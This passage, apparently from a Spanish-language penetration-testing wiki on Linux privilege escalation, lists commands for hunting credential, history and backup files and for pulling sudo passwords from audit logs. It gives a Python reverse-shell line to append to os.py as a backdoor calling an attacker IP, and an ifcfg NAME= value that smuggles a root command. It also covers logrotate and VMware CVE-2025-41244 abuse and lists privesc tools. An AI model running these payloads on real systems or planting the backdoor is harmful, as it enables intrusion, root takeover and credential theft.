### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries en PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Archivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Revisa el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para ello es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que es una aplicación de código abierto usada para recuperar muchas contraseñas almacenadas en un equipo local para Windows, Linux & Mac.

### Registros

Si puedes leer registros, podrías encontrar **información interesante/confidencial en su interior**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos registros de auditoría configurados de forma "**mala**" (¿con backdoor?) **audit logs** pueden permitirte **registrar contraseñas** dentro de los registros de auditoría como se explica en este post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer logs el grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Archivos de Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

También deberías comprobar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también buscar IPs y correos electrónicos dentro de logs, o expresiones regulares de hashes.\
No voy a listar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Archivos escribibles

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Para **backdoor the library** simplemente añade al final de la librería os.py la siguiente línea (cambia IP y PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de logrotate

Una vulnerabilidad en `logrotate` permite a usuarios con **write permissions** sobre un archivo de log o sus directorios padre obtener potencialmente privilegios escalados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante revisar permisos no solo en _/var/log_ sino también en cualquier directorio donde se aplique la rotación de logs.

> [!TIP]
> Esta vulnerabilidad afecta a `logrotate` versión `3.18.0` y anteriores

Más información detallada sobre la vulnerabilidad puede encontrarse en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** así que cuando encuentres que puedes alterar logs, revisa quién gestiona esos logs y verifica si puedes escalar privilegios sustituyendo los logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. Si tienes **espacios en blanco en el nombre el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo lo que esté después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y, a veces, `reload` de servicios. Estos pueden ejecutarse directamente o mediante enlaces simbólicos encontrados en `/etc/rc?.d/`. Una ruta alternativa en sistemas Redhat es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un sistema más reciente de **gestión de servicios** introducido por Ubuntu, que usa archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.

**systemd** surge como un init y gestor de servicios moderno, ofreciendo características avanzadas como arranque on-demand de daemons, gestión de automount y snapshots del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones del administrador, simplificando la administración del sistema.

## Otros Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comúnmente hookean un syscall para exponer funcionalidad privilegiada del kernel a un manager en userspace. Autenticación débil del manager (p. ej., checks de firma basados en FD-order o esquemas de contraseña pobres) puede permitir que una app local se haga pasar por el manager y escale a root en dispositivos ya rooteados. Más información y detalles de explotación aquí:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

El service discovery impulsado por regex en VMware Tools/Aria Operations puede extraer una ruta binaria desde las líneas de comando de procesos y ejecutarla con -v en un contexto privilegiado. Patrones permisivos (p. ej., usando \S) pueden emparejar listeners preparados por el atacante en ubicaciones escribibles (p. ej., /tmp/httpd), llevando a la ejecución como root (CWE-426 Untrusted Search Path).

Aprende más y ve un patrón generalizado aplicable a otros discovery/monitoring stacks aquí:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protecciones de seguridad del Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencias

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
